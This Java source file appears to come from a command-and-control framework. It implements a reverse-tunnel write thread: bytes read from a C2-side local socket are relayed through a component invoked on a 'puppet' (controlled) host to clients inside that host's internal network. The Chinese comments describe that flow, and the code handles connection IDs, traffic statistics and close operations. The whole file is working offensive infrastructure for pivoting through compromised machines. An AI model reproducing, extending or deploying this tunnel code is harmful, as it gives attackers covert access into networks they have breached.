package org.leo.core.engine.reverse;

import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * 从 C2 本地 socket（forwardHost:forwardPort）读 → 通过组件写入 puppet 端。
 * 即"C2 侧目标服务返回的字节"流向"傀儡 accept 到的内网客户端"。
 */
class ReverseWriteThread implements Runnable {

    private static final Logger logger = LoggerFactory.getLogger(ReverseWriteThread.class);

    private final ReverseTunnelServer server;
    private final Socket localSocket;
    private final String connId;

    ReverseWriteThread(ReverseTunnelServer server, Socket localSocket, String connId) {
        this.server = server;
        this.localSocket = localSocket;
        this.connId = connId;
    }

    public void run() {
        JavaPuppetNode puppet = server.getJavaPuppetNode();
        Socks5ProxyStatistics stats = server.getStatistics();
        byte[] buffer = new byte[65535];
        while (server.isRunning()) {
            if (localSocket == null || localSocket.isClosed()) {
                closeRemote();
                return;
            }
            try {
                int length = localSocket.getInputStream().read(buffer);
                if (length == -1) {
                    closeRemote();
                    try { localSocket.close(); } catch (Exception ignored) {}
                    break;
                }
                byte[] data = Arrays.copyOfRange(buffer, 0, length);
                if (stats != null) stats.addDownloadBytes(connId, data.length);

                Map<String, Object> params = new HashMap<String, Object>();
                params.put("op", Integer.valueOf(ReverseTunnelServer.OP_WRITE));
                params.put("connId", connId);
                params.put("data", data);
                Map<String, Object> res = puppet.invokeComponent("ReverseTunnelComponent", params);
                Object code = res != null ? res.get("code") : null;
                if (Integer.valueOf(404).equals(code)) {
                    logger.debug("反向隧道 puppet 侧连接关闭(write): connId={}", connId);
                    break;
                }
            } catch (SocketTimeoutException e) {
                continue;
            } catch (SocketException e) {
                break;
            } catch (Exception e) {
                if (server.isRunning()) {
                    logger.debug("反向隧道写循环异常: connId={} {}", connId, e.getMessage());
                }
                break;
            }
        }
    }

    private void closeRemote() {
        try {
            Map<String, Object> params = new HashMap<String, Object>();
            params.put("op", Integer.valueOf(ReverseTunnelServer.OP_CLOSE));
            params.put("connId", connId);
            server.getJavaPuppetNode().invokeComponent("ReverseTunnelComponent", params);
        } catch (Exception ignored) {}
    }
}
